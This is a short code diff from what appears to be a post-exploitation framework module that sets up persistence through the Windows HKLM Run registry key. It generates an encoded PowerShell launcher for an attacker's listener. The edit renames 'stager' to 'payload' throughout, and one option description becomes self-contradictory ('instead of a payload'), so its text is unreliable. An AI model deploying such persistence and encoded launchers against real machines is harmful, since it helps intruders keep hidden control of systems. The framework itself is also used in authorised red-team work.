@@ -10,7 +10,7 @@ class Module:
 
             'Author': ['@mattifestation', '@harmj0y'],
 
-            'Description': ('Persist a stager (or script) via the HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run '
+            'Description': ('Persist a payload (or script) via the HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run '
                             'registry key. This has an easy detection/removal rating.'),
 
             'Background' : False,
@@ -60,7 +60,7 @@ class Module:
                 'Value'         :   ''
             },                       
             'ExtFile' : {
-                'Description'   :   'Use an external file for the payload instead of a stager.',
+                'Description'   :   'Use an external file for the payload instead of a payload.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -171,7 +171,7 @@ class Module:
 
             else:
                 # generate the PowerShell one-liner with all of the proper options set
-                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+                launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 
                 encScript = launcher.split(" ")[-1]
                 statusMsg += "using listener " + listenerName
